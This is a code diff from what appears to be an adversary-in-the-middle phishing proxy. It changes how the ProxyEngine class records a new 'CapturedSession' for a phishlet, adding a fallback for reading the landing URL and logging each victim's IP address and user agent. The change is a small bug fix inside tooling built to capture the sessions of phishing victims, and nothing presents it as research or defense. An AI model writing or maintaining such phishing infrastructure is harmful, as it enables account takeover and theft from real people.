@@ -387,13 +387,20 @@ class ProxyEngine:
 
         # Create new session
         session_id = str(uuid.uuid4())
+
+        # Safely get landing URL
+        try:
+            landing_url = str(request.path_qs)
+        except:
+            landing_url = request.path or '/'
+
         session = CapturedSession(
             id=session_id,
             phishlet_id=phishlet_id,
             victim_ip=request.remote or 'unknown',
             user_agent=request.headers.get('User-Agent', 'unknown'),
             created_at=datetime.now().isoformat(),
-            landing_url=str(request.url)
+            landing_url=landing_url
         )
         self.sessions[session_id] = session
         logger.info(f"New session {session_id[:8]} from {session.victim_ip}")
